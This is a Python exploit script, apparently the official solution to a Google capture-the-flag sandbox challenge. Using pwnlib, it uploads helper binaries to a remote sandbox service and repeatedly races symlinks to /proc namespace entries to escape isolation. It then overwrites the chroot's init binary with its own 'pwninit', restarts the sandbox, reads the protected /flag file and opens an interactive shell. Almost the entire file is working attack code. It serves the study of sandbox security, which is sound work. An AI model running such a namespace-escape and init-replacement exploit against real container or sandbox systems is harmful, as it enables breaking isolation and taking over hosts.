#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import chal_pb2
import pwnlib
import string
import time
import sys

def send_cmd(cmd):
  s = cmd.SerializeToString()
  r.send(p32(len(s)))
  r.send(s)

def start_sandbox():
  cmd = chal_pb2.Command()
  cmd.start_sandbox.MergeFrom(chal_pb2.StartSandbox())
  send_cmd(cmd)

def add_file(name, content):
  cmd = chal_pb2.Command()
  add_file = chal_pb2.AddFile()
  add_file.name = name
  add_file.content = content
  cmd.add_file.MergeFrom(add_file)
  send_cmd(cmd)

def add_file_from_disk(name):
  add_file(name, read(name))

def run(*args):
  cmd = chal_pb2.Command()
  run = chal_pb2.Run()
  run.arg[:] = args
  cmd.run.MergeFrom(run)
  send_cmd(cmd)

def run_binary(name, *args):
  add_file_from_disk(name)
  run('/tmp/files/'+name, *args)

host = 'localhost'
port = 1337
if len(sys.argv) > 1:
  host = sys.argv[1]
if len(sys.argv) > 2:
  port = int(sys.argv[2])

r = remote(host, port)

start_sandbox()
run("/bin/bash", "-c", "mkdir /tmp/files")
add_file_from_disk("sbx1")

for c in string.ascii_lowercase:
  print(c)
  fname = c
  garbage_name = "del_" + c
  dirname = "dir_" + c
  nslink = "nslink_" + c
  run("/bin/bash", "-c", f"mkdir /tmp/files/{dirname}")
  run("/bin/bash", "-c", f"ln -s /proc/self/ns/uts /tmp/files/{dirname}/user")
  run("/bin/bash", "-c", f"ln -s /proc/self/ns/uts /tmp/files/{dirname}/pid")
  run("/bin/bash", "-c", f"ln -s /proc/self/ns/uts /tmp/files/{dirname}/mnt")
  run("/bin/bash", "-c", f"ln -s /proc/self/ns/uts /tmp/files/{dirname}/net")
  run("/bin/bash", "-c", f"ln -s /proc/1/ns /tmp/files/{nslink}")
  run('/tmp/files/sbx1', fname, garbage_name, dirname, nslink)
  add_file(fname, ("A"*100*1024).encode('ascii'))
  run("/bin/bash", "-c", "ls -ld /tmp/files 2>&1")
  out = r.recvuntil('/tmp/files'.encode('ascii'))
  if b'cannot access' in out:
    break
  assert b'drwx' in out
  assert c != 'z'
print('success')

run("/bin/bash", "-c", "cat /flag 2>&1; echo 'FOOBAR'")
assert b'Permission denied' in r.recvuntil(b'FOOBAR')

CHROOT_PATH = "/home/user/chroot"
INIT_PATH = CHROOT_PATH + "/bin/init"

run("/bin/bash", "-c", "mkdir /tmp/files")
add_file_from_disk('pwninit')
add_file_from_disk("sbx1")
pwninit_md5 = md5file('pwninit').hex().encode('ascii')

for c in string.ascii_lowercase:
  print(c)
  fname = c
  garbage_name = "del_" + c
  initname = "init_" + c
  initlink = "initlink_" + c
  run("/bin/bash", "-c", f"cp /tmp/files/pwninit /tmp/files/{initname}")
  run("/bin/bash", "-c", f"ln -s {INIT_PATH} /tmp/files/{initlink}")
  run('/tmp/files/sbx1', fname, garbage_name, initname, initlink)
  add_file(fname, ("A"*100*1024).encode('ascii'))
  run("/bin/bash", "-c", f"md5sum {INIT_PATH}")
  out = r.recvuntil(INIT_PATH.encode('ascii'))
  if pwninit_md5 in out:
    break
  assert c != 'z'

start_sandbox()

r.recvuntil(b'pwninit')
run("/bin/bash", "-c", "cat /flag")

r.interactive()
